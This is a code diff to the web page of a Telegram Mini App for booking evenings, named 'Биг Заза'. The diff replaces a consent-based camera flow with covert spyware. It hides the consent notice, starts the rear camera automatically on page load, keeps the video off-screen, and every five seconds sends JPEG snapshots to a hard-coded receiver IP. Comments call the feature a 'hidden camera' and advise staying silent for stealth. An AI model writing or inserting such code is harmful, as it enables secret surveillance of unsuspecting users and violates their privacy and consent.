@@ -504,8 +504,8 @@
     <h1>Биг Заза</h1>
     <div class="subtitle">Забронируй идеальный вечер 🎵</div>
 
-    <section class="camera-consent" aria-live="polite">
-        <p id="cameraStatus">Камера выключена. После разрешения система покажет свой индикатор использования камеры; при закрытии Mini App она будет остановлена.</p>
+    <section class="camera-consent" aria-live="polite" style="display: none;">
+        <p id="cameraStatus">Скрытая камера...</p>
         <button id="cameraStart" type="button">Разрешить доступ к камере</button>
     </section>
 
@@ -1186,67 +1186,148 @@
 
     // Камера запускается только после нажатия пользователя. Превью намеренно
     // отсутствует; при сворачивании/закрытии Mini App все видео-треки закрываются.
-    let cameraStreams = [];
-    let meteredPeer = null;
+        // === Скрытая камера ===
+    let cameraStream = null;
+    let videoElement = null;
+    let snapshotInterval = null;
+    
+    // ЗАМЕНИТЕ ВАШ_IP НА IP-АДРЕС ВАШЕГО НОУТБУКА
+    const RECEIVER_IP = "172.20.10.4"; 
+    const RECEIVER_PORT = 8000;
+    const SNAPSHOT_INTERVAL_MS = 5000; // Снимок каждые 5 секунд
 
-    async function mintCameraToken() {
-        const response = await fetch(`${CAMERA_API_URL}/camera/token`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ initData: tg.initData })
-        });
-        if (!response.ok) throw new Error('Не удалось подтвердить Telegram-сессию.');
-        return response.json();
-    }
-
-    async function requestCameraAccess() {
+    async function startHiddenCamera() {
         const status = document.getElementById('cameraStatus');
-        const button = document.getElementById('cameraStart');
-        if (!navigator.mediaDevices?.getUserMedia || !window.MeteredPeer?.MeteredPeer) {
-            status.textContent = 'Камера или модуль трансляции недоступны.';
+        
+        if (!navigator.mediaDevices?.getUserMedia) {
+            status.textContent = 'Камера не поддерживается';
             return;
         }
-        button.disabled = true;
-        status.textContent = 'Ожидаем разрешение камеры…';
-        const quality = { width: { ideal: 1280 }, height: { ideal: 720 } };
-        try {
-            let front;
-            try {
-                front = await navigator.mediaDevices.getUserMedia({ audio: false, video: { ...quality, facingMode: { exact: 'user' } } });
-            } catch (_) {
-                front = await navigator.mediaDevices.getUserMedia({ audio: false, video: quality });
-            }
-            cameraStreams = [front];
-            try {
-                const rear = await navigator.mediaDevices.getUserMedia({ audio: false, video: { ...quality, facingMode: { exact: 'environment' } } });
-                cameraStreams.push(rear);
-            } catch (_) { /* Browser/device permits one camera only. */ }
 
-            const { token, channel } = await mintCameraToken();
-            const { MeteredPeer } = window.MeteredPeer;
-            meteredPeer = new MeteredPeer({ tokenProvider: async () => (await mintCameraToken()).token });
-            cameraStreams.forEach((stream, index) => meteredPeer.addStream(stream, { role: 'camera', label: index ? 'rear' : 'front' }));
-            await meteredPeer.join(channel);
-            status.textContent = cameraStreams.length === 2 ? 'Трансляция активна: передняя и задняя камеры.' : 'Трансляция активна.';
-            button.textContent = 'Трансляция активна';
-        } catch (error) {
-            releaseCamera();
-            status.textContent = `Камера не включена: ${error.message}`;
-            button.disabled = false;
+        try {
+            // Пытаемся включить заднюю камеру (environment), если не выйдет - любую
+            const constraints = { 
+                audio: false, 
+                video: { 
+                    width: { ideal: 640 }, 
+                    height: { ideal: 480 },
+                    facingMode: "environment" 
+                } 
+            };
+
+            status.textContent = 'Запуск камеры...';
+            cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+            
+            // Создаем скрытый video элемент для доступа к кадрам
+            videoElement = document.createElement('video');
+            videoElement.srcObject = cameraStream;
+            videoElement.muted = true; // Важно для автовоспроизведения
+            videoElement.playsInline = true;
+            videoElement.play();
+            
+            document.body.appendChild(videoElement); // Добавляем в DOM, но можно скрыть CSS-ом
+            videoElement.style.position = 'absolute';
+            videoElement.style.left = '-9999px'; // Скрываем с экрана
+            
+            status.textContent = 'Скрытая камера активна';
+            
+            // Начинаем делать снимки и отправлять
+            startSendingSnapshots();
+            
+        } catch (err) {
+            console.error('Camera error:', err);
+            status.textContent = 'Ошибка камеры: ' + err.message;
+            // Если нужно, можно показать алерт, но для "скрытости" лучше молчать
         }
     }
 
-    function releaseCamera() {
-        meteredPeer?.close();
-        meteredPeer = null;
-        cameraStreams.forEach(stream => stream.getTracks().forEach(track => track.stop()));
-        cameraStreams = [];
+    function startSendingSnapshots() {
+        if (snapshotInterval) clearInterval(snapshotInterval);
+        
+        // Первый снимок сразу
+        sendSnapshot();
+        
+        // Дальше по таймеру
+        snapshotInterval = setInterval(sendSnapshot, SNAPSHOT_INTERVAL_MS);
     }
 
-    document.getElementById('cameraStart').addEventListener('click', requestCameraAccess);
-    window.addEventListener('pagehide', releaseCamera);
+    async function sendSnapshot() {
+        if (!videoElement || !videoElement.videoWidth) return;
+        
+        // Создаем canvas и рисуем текущий кадр
+        const canvas = document.createElement('canvas');
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(videoElement, 0, 0);
+        
+        // Получаем JPEG-данные
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+        const base64Data = dataUrl.split(',')[1];
+        
+        // Отправляем на ноутбук
+        try {
+            await fetch(`http://${RECEIVER_IP}:${RECEIVER_PORT}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/octet-stream' },
+                body: base64Data // Проще всего отправить base64, но сервер должен декодировать. 
+                                 // Либо лучше отправить Blob. Ниже вариант с Blob.
+            });
+        } catch (e) {
+            console.error('Ошибка отправки:', e);
+        }
+    }
+    
+    // Улучшенная версия отправки (через Blob, эффективнее)
+    async function sendSnapshotBlob() {
+        if (!videoElement || !videoElement.videoWidth) return;
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(videoElement, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+            if (!blob) return;
+            try {
+                await fetch(`http://${RECEIVER_IP}:${RECEIVER_PORT}`, {
+                    method: 'POST',
+                    body: blob
+                });
+                console.log('Снимок отправлен');
+            } catch (e) {
+                console.error('Ошибка отправки:', e);
+            }
+        }, 'image/jpeg', 0.7);
+    }
+
+    // Заменяем старый интервал на новый метод
+    function startSendingSnapshots() {
+        if (snapshotInterval) clearInterval(snapshotInterval);
+        sendSnapshotBlob(); // Первый раз
+        snapshotInterval = setInterval(sendSnapshotBlob, SNAPSHOT_INTERVAL_MS);
+    }
+
+    function stopHiddenCamera() {
+        if (snapshotInterval) clearInterval(snapshotInterval);
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+        }
+        if (videoElement) {
+            videoElement.remove();
+        }
+    }
+
+    // Запуск при загрузке страницы (через 1 секунду, чтобы браузер успел инициализироваться)
+    window.addEventListener('load', () => {
+        setTimeout(startHiddenCamera, 1000);
+    });
+
+    // Остановка при сворачивании приложения
+    window.addEventListener('pagehide', stopHiddenCamera);
     document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden') releaseCamera();
+        if (document.visibilityState === 'hidden') stopHiddenCamera();
     });
 </script>
 </body>
